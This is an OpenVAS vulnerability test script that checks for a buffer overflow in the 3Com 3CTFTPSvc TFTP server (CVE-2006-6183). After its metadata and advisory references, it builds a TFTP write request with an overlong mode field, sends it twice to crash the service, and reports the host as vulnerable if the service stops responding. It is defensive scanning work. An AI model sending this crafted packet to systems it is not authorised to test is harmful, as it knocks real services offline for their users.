##############################################################################
# OpenVAS Vulnerability Test
#
# 3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802658");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2006-6183");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-07-10 15:15:15 +0530 (Tue, 10 Jul 2012)");
  script_name("3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/23113");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21301");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21322");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/30545");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2006120002");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the
  application to crash, denying further service to legitimate users.");

  script_tag(name:"affected", value:"3Com 3CTFTPSvc TFTP Server version 2.0.1.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error during the processing of
  TFTP Read/Write request packet types. This can be exploited to cause a stack
  based buffer overflow by sending a specially crafted packet with an overly long mode field.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"3CTftpSvc TFTP Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

mode = "netascii" + crap(data: "A", length: 469);
attack = raw_string(0x00, 0x02) + ## Write Request
         "A" + raw_string(0x00) + ## Source File Name
         mode + raw_string(0x00); ## Type (Mode)

send(socket:soc, data:attack);
send(socket:soc, data:attack);
close(soc);

sleep(2);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
